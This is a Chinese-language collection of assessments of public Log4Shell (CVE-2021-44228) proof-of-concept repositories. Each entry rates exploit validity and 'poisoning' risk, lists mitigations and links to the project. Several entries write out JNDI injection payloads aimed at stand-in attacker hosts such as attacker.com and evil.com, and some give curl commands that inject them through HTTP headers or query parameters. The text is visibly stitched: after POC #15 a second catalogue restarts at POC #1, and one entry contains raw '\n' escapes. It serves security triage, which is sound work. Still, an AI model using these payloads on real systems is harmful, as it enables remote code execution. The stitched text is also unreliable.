**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
